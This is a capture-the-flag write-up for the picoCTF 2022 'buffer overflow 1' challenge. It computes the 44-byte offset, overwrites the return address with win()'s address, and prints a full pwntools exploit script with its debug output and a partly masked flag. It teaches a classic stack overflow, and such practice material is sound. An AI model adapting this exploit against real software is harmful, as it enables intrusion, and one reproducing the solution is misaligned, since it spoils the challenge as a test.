# buffer overflow 1

Tags: picoCTF 2022, Binary Exploitation

| Author | Point    |
| ------ | -------- |
| SANJAY C / PALASH OSWAL | 200 points |

## Description

Control the return address  
Now we're cooking! You can overflow the buffer and return to the flag function in the program.  
You can view source here. And connect with it using nc saturn.picoctf.net 51768  

## Solve

The distance from buf to the return address is -0x02c, which is 44 bytes.

![](<./images/CleanShot 2024-04-17 at 20.43.58.png>)

Overflow buf and overwrite return address. The offset to the return address is 44 bytes.

function win() address is 0x080491f6.

![](<./images/CleanShot 2024-04-17 at 20.48.36.png>)

So, the following is the payload:

```python
payload = b''
payload += b'A' * 44
payload += p32(0x080491f6)
```

The full exploit code is as follows.

```python
from pwn import *

context.log_level = 'debug'

host = 'saturn.picoctf.net'
port = 62804

p = remote(host, port)

p.recvline()

payload = b''
payload += b'A' * 44
payload += p32(0x080491f6)

p.sendline(payload)

p.recvall()
```

```bash
$ python3 exploit.py
[+] Opening connection to saturn.picoctf.net on port 62804: Done
[DEBUG] Received 0x1b bytes:
    b'Please enter your string: \n'
[DEBUG] Sent 0x31 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  f6 91 04 08  │AAAA│AAAA│AAAA│····│
    00000030  0a                                                  │·│
    00000031
[+] Receiving all data: Done (100B)
[DEBUG] Received 0x40 bytes:
    b'Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\n'
[DEBUG] Received 0x24 bytes:
    b'picoCTF{addr3ss3s_ar3_3asy_********}'
[*] Closed connection to saturn.picoctf.net port 62804
```

## Flag

```
picoCTF{addr3ss3s_ar3_3asy_********}
```